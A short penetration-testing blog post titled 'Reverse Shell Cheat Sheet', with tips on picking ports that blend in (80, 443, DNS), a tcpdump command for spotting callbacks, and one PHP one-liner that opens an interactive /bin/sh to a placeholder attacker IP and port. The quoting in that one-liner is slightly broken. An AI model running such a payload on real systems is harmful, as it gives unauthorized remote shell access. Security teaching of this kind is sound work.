---
layout: post
title:  "Reverse Shell Cheat Sheet"
date:   2017-01-17 20:56:00 -0600
---

## Reverse Shell Cheat Sheet: Cause everyone has one

If enumeration is the bread and butter of penetration testing, reverse shells are the cheesecake. Stolen usernames and passwords may be one of the most reliable ways to get into a system, but theres nothing like messing something up a bunch and then finally seeing that reverse shell prompt pop up. These are some quick and easy ones in different formats.

## First, some thoughts

Reverse shells are great, but you need to make sure they get to you. Way too many reverse shells and exploits code the exploit to send reverse shells back to port 4444. If you see this port active in a production environment and can't immediately recognize why, you need to figure it out. You may have been popped by someone who barely knows what they're doing which probably also means someone way worse is already in. 

If you're going to send yourself back a reverse shell, try ports that people should expect to see. Port 80 and 443 are great, but so is DNS. [This](http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html) is an excellent write up of RCE found in Facebook that had to use outbound DNS to send results back to his listening machine. Amazing stuff. 

If you think it should work and it's not, tcpdump or wireshark your host (if you can) and see what's coming and going. If I'm trying to exploit a web app on port 80 to send back a remote shell, one tcpdump quickie I use is 

~~~
tcpdump -qtpni eth0/tap0/whatever0 host <VICTIMIP> and not port 80 
~~~

That watches traffic for anything coming back and gives you a condensed, simple output for it only on the interface you expect the attack to copme back through (tap0 if you're on a VPN, for example), listening only for the victim host so you don't see a bunch of other noise and excluding the port you know you're going to see traffic on. In this case, since I'm attacking port 80, I'm probably listening on port 443 with a netcat listener. You could specify port 443 only, but this wouldn't catch if you did something wrong in your exploit and are sending the exploit back to the wrong port (we all make mistakes). 

###PHP
~~~
'<?php  echo shell_exec(php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3"); ?>'
~~~

